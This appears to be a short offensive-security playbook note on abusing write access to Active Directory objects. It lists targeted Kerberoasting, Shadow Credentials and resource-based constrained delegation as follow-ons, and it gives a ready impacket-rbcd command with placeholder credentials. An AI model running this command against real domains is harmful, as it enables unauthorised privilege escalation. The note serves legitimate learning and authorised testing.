You can modify certain attributes of the target AD object.

- User object: modify `servicePrincipalName`, potentially enabling targeted Kerberoasting.
- Computer object: modify the RBCD-related attribute, potentially enabling RBCD.

---
#### **If target is a User:**
1. [[Targeted Kerberoasting]]
2. [[Shadow Credentials]]

---
#### **If target is a Computer:**
1. [[RBCD]]
2. [[Shadow Credentials]]

For RBCD on a computer, use:

```
impacket-rbcd -action write \
-delegate-from 'OWNED$' \
-delegate-to 'TARGET$' \
'corp.local/alice:Password123!' \
-dc-ip 10.10.10.10
```
